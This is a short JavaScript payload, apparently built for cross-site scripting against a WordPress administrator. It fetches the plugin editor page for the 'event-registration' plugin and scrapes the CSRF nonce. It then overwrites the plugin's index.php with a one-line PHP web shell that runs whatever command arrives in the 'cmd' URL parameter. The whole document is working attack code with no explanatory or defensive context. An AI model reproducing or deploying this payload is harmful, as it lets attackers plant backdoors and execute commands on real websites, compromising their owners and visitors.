var ajax = new XMLHttpRequest();
ajax.open("GET","/wp-admin/plugin-editor.php?file=event-registration%2Fevent%2Findex.php&plugin=event-registration%2FEVNTREG.php",true);
ajax.onreadystatechange = function(){
		if(this.readyState == 4){
			if(this.status == 200){
				
				var re = /id="_wpnonce" name="_wpnonce" value="(\w+)"/;
				var result = this.responseText.match(re);
				var nonce = result[1];
				
			    ajax.open("POST","/wp-admin/plugin-editor.php?file=event-registration%2Fevent%2Findex.php&plugin=event-registration%2FEVNTREG.php",true);
			    
			    var params = "newcontent=<?php die(exec($_GET['cmd']));";
			    params += "&_wpnonce=" + nonce + "&action=update&file=event-registration/event/index.php&plugin=event-registration/event/index.php&scrollto=0&submit=Datei aktualisieren";
			    
			    ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			    ajax.setRequestHeader("Content-length", params.length);
			    ajax.setRequestHeader("Connection", "close");

			    ajax.send(params);
			}
		}
	}
ajax.send();
